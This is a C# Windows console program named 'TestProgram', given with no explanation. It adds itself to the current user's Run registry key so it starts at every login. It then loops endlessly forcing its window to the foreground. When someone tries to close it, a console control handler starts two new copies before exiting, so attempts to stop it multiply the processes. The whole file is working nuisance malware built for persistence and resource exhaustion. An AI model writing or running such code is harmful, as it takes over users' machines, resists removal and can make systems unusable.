using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TestProgram {
    class Program {
        static void Main() {
            Program run = new Program();
            run.Run();
        }
        private void Run() {
            _handler += Handler;
            SetConsoleCtrlHandler(_handler, true);
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            rk.SetValue("TestProgram", Application.ExecutablePath);
            while (true) { SetForegroundWindow(GetConsoleWindow()); }
        }
        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
        private delegate bool EventHandler();
        private static EventHandler _handler;
        private static bool Handler() {
            Process.Start(Application.ExecutablePath);
            Process.Start(Application.ExecutablePath);
            Environment.Exit(-1);
            return true;
        }
    }
}